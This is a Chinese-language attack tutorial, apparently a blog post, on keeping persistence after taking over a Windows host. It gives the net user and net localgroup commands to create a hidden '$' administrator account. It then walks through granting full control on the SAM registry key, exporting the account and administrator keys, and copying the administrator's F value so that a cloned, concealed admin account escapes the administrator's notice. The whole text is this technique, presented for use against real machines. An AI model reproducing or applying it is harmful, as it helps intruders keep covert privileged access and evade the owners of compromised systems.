用户的隐藏当我们拿下主机之后，维持权限最好用的方式就是添加一个用户，可以随意进行远程桌面登录，但是添加用户很容易被管理员发现。  
  
当我们通过命令行添加一个$符号结尾的用户时，该用户会进行隐藏。net user是查询不到的，但是组管理处会查到该用户。终极方法是通过注册表添加用户，彻底隐藏用户不被发现。  
  
添加用户 添加用户1234$,顺便添加到管理员组

*   
*   

```
`net user 1234$ 123456 /add``net localgroup administrators 1234$ /add`
```

![](../Images/94206234cbcf60cf7b9d1aa49ab328af.png)此时net user是看不到这个用户的，但是在用户组能看到存在1234$用户![](../Images/e6a5ef20325528c823b4ec4f4240f9e7.png)  
打开注册表运行regedit打开注册表，SAM没有修改权限的话是不能查看其中内容的修改local->SAM权限，添加用户权限为完全控制![](../Images/a20a28065d627a006ed816f6bb532105.png)然后重新打开注册表，现在可以查看SAM下的内容了![](../Images/fa1df8293cc4c7717085de1f3c703a92.png)  
导出注册表找到1234$账户，每个账户对应一个默认值（0x3e9）该值对应上面的二进制项03E9将账号和对应的注册表项导出（我重命名为1.reg和2.reg）![](../Images/99338d701793b64199b9b170712c356a.png)

顺便导出管理员权限用户对应的项，也就是01F4（重命名为3.reg）

现在有三个文件，两个是用户的，一个是管理员的

![](../Images/503644687ac5127518e05b87c9f9dd93.png)将添加用户的二进制项F值替换为管理员的F值![](../Images/2b10ca866798a8701eb3c53b0bebcc5c.png)
